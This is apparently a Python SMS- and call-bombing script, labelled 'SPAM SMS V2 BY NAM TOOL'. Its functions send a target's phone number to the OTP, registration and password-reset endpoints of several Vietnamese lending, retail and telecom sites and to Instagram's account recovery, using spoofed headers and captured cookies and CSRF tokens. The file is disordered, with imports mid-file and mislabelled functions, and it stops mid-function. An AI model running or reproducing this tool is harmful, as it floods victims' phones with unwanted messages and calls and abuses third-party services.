import requests
import string
import random
def generateRandomString(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def moneyveo(phone):
    head = {
        "Host": "moneyveo.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
    }
    response = requests.get("https://moneyveo.vn/vi/registernew/", headers=head)
    ck = response.headers["Set-Cookie"].split(";")[0] + ";"
    data = 'phoneNumber=' + phone
    head = {
        "Host": "moneyveo.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
        "cookie": ck
    }
    response = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=head)
    if '200'in response.text:
      print(format_print("$","MONEYVEO THÀNH CÔNG"))
    else:
      print(format_print("$","MONEYVEO THẤT BẠI"))
#2
def call(phone):
    cookies = {
        '_gcl_au': '1.1.1220684632.1686908084',
        'mousestats_vi': 'b9bd217114711a9d1e4d',
        '_tt_enable_cookie': '1',
        '_ttp': 'DA7mc7Uixiy6xP7mj1rjKm50ltN',
        '_ym_uid': '1686908086798167851',
        '_ym_d': '1686908086',
        'supportOnlineTalkID': 'TwQhuH4Ivv3H9eD0EtQAXMx5Myuu3vyx',
        'jslbrc': 'w.20230616093528211c112e-0c29-11ee-a59e-ee07a4cd7f9b.A_GS',
        '__cfruid': '29d5a9d7c2b2952e6ede5a8a00b88b99cad87e3e-1687066316',
        '_gcl_aw': 'GCL.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE',
        '_gid': 'GA1.2.995351727.1687066329',
        '_gac_UA-49883034-25': '1.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE',
        'mousestats_si': 'd57e5d5c25fbd471e1a0',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        'XSRF-TOKEN': 'eyJpdiI6ImVnWUpoLzZxTGRITElHK0N6R3BYVXc9PSIsInZhbHVlIjoiWnBOZzMwOHl4aE15R3BKNEcwSk1Cbkg5eitEYm5NL2RzckI2cHBIMVdUa2ZpK09yOUp3VXVIWjBwQVEvOEM5blRIaWZKSzZnNjk3RW93aEhRT1E0T3JNV0N1NGxLcFZhazFDTjQyZjRqekxEWDJUOUJkMEtjTVdLaXltVGg1YkQiLCJtYWMiOiIwNGI5Y2IyYTE2OWM2NmU5Njc4YTJlNjgwNzRhZDljY2JiMjcxZTVhYmRjOTYxMzM1ZmI4MDA4MTQyOTJkZDAzIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6ImRhTWVBZXVET0wxTWRTdnIzQVhvWWc9PSIsInZhbHVlIjoiejZFenByV2pYcHREZFFpVlBIY1krWDloVEtLZmZsblRBcGVwK2IzMkVxblVwWTM0V3dEcDFVb0txUFVFckQ5bXMyZ2pzTGNDQStYNlhkNHVkVTRWOE1pa0xxQnZrSW9nZzhqMXZOaGtIMjJLdzNkRUllR2cwZXh3OVRlRTFUOWQiLCJtYWMiOiJmN2NkZjQ5YjU2MzFiNjQ4NjZiN2U4ZGFiZWJmNjNjZjA2Mjk5ZTA2NTAxMTUzZTU4MTNiNDA5ZTdkYTkwMDg0IiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkFDcHM0UHh1NzhZZTZ5MnphMzR1OWc9PSIsInZhbHVlIjoiTHBoTDdFRjgwOFRWeWdoSkZ4ZWVmT1NhZnk5YjdreWJhZmFpVFcrUFhPc0ROaUtsNEgrSW1DWVM1YTZ3b2RYVjdOZHk1bU1ObFl3WHFGOGdOdjkyZVdkWjZOWnlOTXZESHZ3emJrYml2YkhLNXFCN2RFQWVuQm1HMG5CWlF4aTciLCJtYWMiOiI5M2NkNzY3Mzg2Mzk2MTk3ZTQ3ZjVlMzMzNTZiMTFkMzU3MDIwYjJmNTg1MzhlOWEyOGM1YTBiYTZiZWFiNDlkIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        '_ga_EBK41LH7H5': 'GS1.1.1687066331.4.1.1687066336.0.0.0',
        '_ga': 'GA1.1.1463404161.1686908084',
        'ec_etag_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'ec_etag_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'ec_etag_client': 'false',
        'ec_png_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'ec_png_client': 'false',
        'ec_png_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        '_clck': '1v0x9dl|2|fck|0|1262',
        'uid': '6e7c3667-7f57-aeb3-742a-179ed2570f1e',
        'client': 'false',
        'client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        '_clsk': 'pu0t|1687066342104|1|1|t.clarity.ms/collect',
        'amp_6e403e': '206vjTKXep_KxfYKYDBKzV.Ym9kb2lxdWExODlAZ21haWwuY29t..1h36fsjk0.1h36fsjk7.0.3.3',
    }
    headers = {
        'authority': 'robocash.vn',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1220684632.1686908084; mousestats_vi=b9bd217114711a9d1e4d; _tt_enable_cookie=1; _ttp=DA7mc7Uixiy6xP7mj1rjKm50ltN; _ym_uid=1686908086798167851; _ym_d=1686908086; supportOnlineTalkID=TwQhuH4Ivv3H9eD0EtQAXMx5Myuu3vyx; jslbrc=w.20230616093528211c112e-0c29-11ee-a59e-ee07a4cd7f9b.A_GS; __cfruid=29d5a9d7c2b2952e6ede5a8a00b88b99cad87e3e-1687066316; _gcl_aw=GCL.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE; _gid=GA1.2.995351727.1687066329; _gac_UA-49883034-25=1.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE; mousestats_si=d57e5d5c25fbd471e1a0; _ym_isad=1; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6ImVnWUpoLzZxTGRITElHK0N6R3BYVXc9PSIsInZhbHVlIjoiWnBOZzMwOHl4aE15R3BKNEcwSk1Cbkg5eitEYm5NL2RzckI2cHBIMVdUa2ZpK09yOUp3VXVIWjBwQVEvOEM5blRIaWZKSzZnNjk3RW93aEhRT1E0T3JNV0N1NGxLcFZhazFDTjQyZjRqekxEWDJUOUJkMEtjTVdLaXltVGg1YkQiLCJtYWMiOiIwNGI5Y2IyYTE2OWM2NmU5Njc4YTJlNjgwNzRhZDljY2JiMjcxZTVhYmRjOTYxMzM1ZmI4MDA4MTQyOTJkZDAzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImRhTWVBZXVET0wxTWRTdnIzQVhvWWc9PSIsInZhbHVlIjoiejZFenByV2pYcHREZFFpVlBIY1krWDloVEtLZmZsblRBcGVwK2IzMkVxblVwWTM0V3dEcDFVb0txUFVFckQ5bXMyZ2pzTGNDQStYNlhkNHVkVTRWOE1pa0xxQnZrSW9nZzhqMXZOaGtIMjJLdzNkRUllR2cwZXh3OVRlRTFUOWQiLCJtYWMiOiJmN2NkZjQ5YjU2MzFiNjQ4NjZiN2U4ZGFiZWJmNjNjZjA2Mjk5ZTA2NTAxMTUzZTU4MTNiNDA5ZTdkYTkwMDg0IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkFDcHM0UHh1NzhZZTZ5MnphMzR1OWc9PSIsInZhbHVlIjoiTHBoTDdFRjgwOFRWeWdoSkZ4ZWVmT1NhZnk5YjdreWJhZmFpVFcrUFhPc0ROaUtsNEgrSW1DWVM1YTZ3b2RYVjdOZHk1bU1ObFl3WHFGOGdOdjkyZVdkWjZOWnlOTXZESHZ3emJrYml2YkhLNXFCN2RFQWVuQm1HMG5CWlF4aTciLCJtYWMiOiI5M2NkNzY3Mzg2Mzk2MTk3ZTQ3ZjVlMzMzNTZiMTFkMzU3MDIwYjJmNTg1MzhlOWEyOGM1YTBiYTZiZWFiNDlkIiwidGFnIjoiIn0%3D; ec_cache_utm=6e7c3667-7f57-aeb3-742a-179ed2570f1e; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; _ga_EBK41LH7H5=GS1.1.1687066331.4.1.1687066336.0.0.0; _ga=GA1.1.1463404161.1686908084; ec_etag_utm=6e7c3667-7f57-aeb3-742a-179ed2570f1e; ec_etag_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; ec_etag_client=false; ec_png_utm=6e7c3667-7f57-aeb3-742a-179ed2570f1e; ec_png_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; _clck=1v0x9dl|2|fck|0|1262; uid=6e7c3667-7f57-aeb3-742a-179ed2570f1e; client=false; client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; _clsk=pu0t|1687066342104|1|1|t.clarity.ms/collect; amp_6e403e=206vjTKXep_KxfYKYDBKzV.Ym9kb2lxdWExODlAZ21haWwuY29t..1h36fsjk0.1h36fsjk7.0.3.3',
        'dnt': '1',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/register',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '_token': 'CutanxfZckD1Qdr73OLBR5qbqSSkssd6aF5W7fm3',
    }

    response = requests.post('https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
    if 'success' in response.text:
      print(format_print("$","CALL THÀNH CÔNG"))
    else:
      print(format_print("$","CALL THẤT BẠI"))
#3
def vay(phone):
    global thanhcong
    cookies = {
        '_gcl_au': '1.1.1234341675.1686922968',
        '_tt_enable_cookie': '1',
        '_ttp': 'WyNAskSGc-MRWecC-x4AoVux6yP',
        '_ym_uid': '1686922982967271010',
        '_ym_d': '1686922982',
        '_ga_P2783EHVX2': 'GS1.1.1687052163.3.0.1687052163.60.0.0',
        '_ga': 'GA1.1.1535606375.1686922968',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1234341675.1686922968; _tt_enable_cookie=1; _ttp=WyNAskSGc-MRWecC-x4AoVux6yP; _ym_uid=1686922982967271010; _ym_d=1686922982; _ga_P2783EHVX2=GS1.1.1687052163.3.0.1687052163.60.0.0; _ga=GA1.1.1535606375.1686922968',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'login': phone,
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
    if 'true' in response.text:
      print(format_print("$","VAY THÀNH CÔNG"))
    else:
      print(format_print("$","VAY THẤT BẠI"))
def check_key():
  Banner()
  print(format_print("Nhấn Số","1"))
  choose=int(input(format_input("Chọn Số",": ")))
  if choose==1:  
    tk=input(format_input("\/","Nhấn Số 1 [NAM~TOOL]: "))
    mk=input(format_input("\/","Nhấn Số 2 [NAM~TOOL]: "))
    if (tk=='1' and mk=='2'):
      print(format_print("~","CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI SPAM SMS V2 BY NAM TOOL"))
      time.sleep(3)
      admin()
    while (tk!='' and mk!='')or (tk!='' and mk=='') or (tk=='namtool2k7' and mk!='nam2007') :
        print(format_print("~","NHẬP SAI RỒI!"))
        time.sleep(3)
        os.system('cls')
        Banner()
        tk=input(format_input("\/","Nhập Tài Khoản [namtool131]: "))
        mk=input(format_input("\/","Nhập Mật Khẩu [nam2007]: "))
        if (tk=='namtool131' and mk=='nam2007'):
          print(format_print("~","Chào Mừng ADMIN Quay Trở Lại!"))
          time.sleep(3)
          admin()
  if choose==2:
      alo123()
def kiotviet(phone):
  def random_string(length):
      import random
      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result = ""
      for _ in range(length):
          result += random.choice(characters)
      return result
  alo=random_string(8)
  ten=random_string(4)
  phone = '0' + phone
  phone = phone.replace('00','')
  phone12 = '+84' + phone

  cookies = {
      'ads': 'www.google.com',
      'refcode': '746',
      'time_referer': '1689061704',
      'kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5',
      'kvas-uuid-d': '1686469706132',
      'gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1',
      'gkvas-uuid-d': '1686469706134',
      'kv-session': '94e736d4-493e-4656-9a6a-266817374182',
      '_hjFirstSeen': '1',
      '_hjIncludedInSessionSample_563959': '1',
      '_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==',
      '_gid': 'GA1.2.1638977009.1686469708',
      '_tt_enable_cookie': '1',
      '_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd',
      '_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
      '_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
      'source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D',
      'kv-session-d': '1686469712238',
      '_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==',
      'parent': '77',
      '_ga': 'GA1.2.1398574114.1686469708',
      '_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0',
      '_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
  }

  headers = {
      'authority': 'www.kiotviet.vn',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'cookie': 'ads=www.google.com; refcode=746; time_referer=1689061704; kvas-uuid=3a85af4a-1908-48f2-980d-d15395992de5; kvas-uuid-d=1686469706132; gkvas-uuid=fc23dc65-4af3-4711-8198-90a46e6b0ca1; gkvas-uuid-d=1686469706134; kv-session=94e736d4-493e-4656-9a6a-266817374182; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==; _gid=GA1.2.1638977009.1686469708; _tt_enable_cookie=1; _ttp=KrXyjN8UQfZPEg6udl4pOmk7Tnd; _gac_UA-158809353-1=1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; _gac_UA-64814867-1=1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; source_referer=%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D; kv-session-d=1686469712238; _hjSessionUser_563959=eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==; parent=77; _ga=GA1.2.1398574114.1686469708; _ga_6HE3N545ZW=GS1.1.1686469708.1.1.1686469715.53.0.0; _fw_crm_v=4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
      'dnt': '1',
      'origin': 'https://www.kiotviet.vn',
      'referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746',
      'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
  }

  data = {
      'phone': phone12,
      'code': alo,
      'name': 'lê van sang',
      'email': '',
      'zone': 'An Giang - Huyện Châu Phú',
      'merchant': 'muabansi',
      'username': phone,
      'industry': 'Thời trang',
      'ref_code': '746',
      'industry_id': '77',
      'phone_input': phone,
  }

  response = requests.post(
      'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
      cookies=cookies,
      headers=headers,
      data=data,
  )
  if 'success' in response.text:
    print(format_print("$","KIOTVIET THÀNH CÔNG"))
  else:
    print(format_print("$","KIOTVIET THẤT BẠI"))
def tienoi(phone):
    head = {
        "Host": "app.tienoi.com.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://app.tienoi.com.vn",
        "referer": "https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
    }
    data = {
        "mobilePhone": phone,
        "password": "A123456789a",
        "passwordConfirmation": "A123456789a",
        "isVoiceSms": True
    }
    
    session = requests.Session()
    
    url = "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode"
    response = session.post(url, json=data, headers=head)
    print(format_print("$","AVALLI: THÀNH CÔNG"))
import colorama
from colorama import Fore, Back, Style
import os, sys
import requests, json
import uuid, threading
import time, random, string
from lequangminh import *
import platform, hashlib
import time
colorama.init(autoreset=True)
import requests
import re
import random
from html import unescape
thanhcong=0
i=0
phone=''
import requests
def oldfacebook(phone):
    global thanhcong
    response = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})
    if response.status_code == 200:
        print(format_print("$", "FACEBOOK: THÀNH CÔNG"))
        thanhcong+=1
    else:
        print(format_print("$","FACEBOOK: THẤT BẠI"))
def myviettel(phone):
    global thanhcong
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
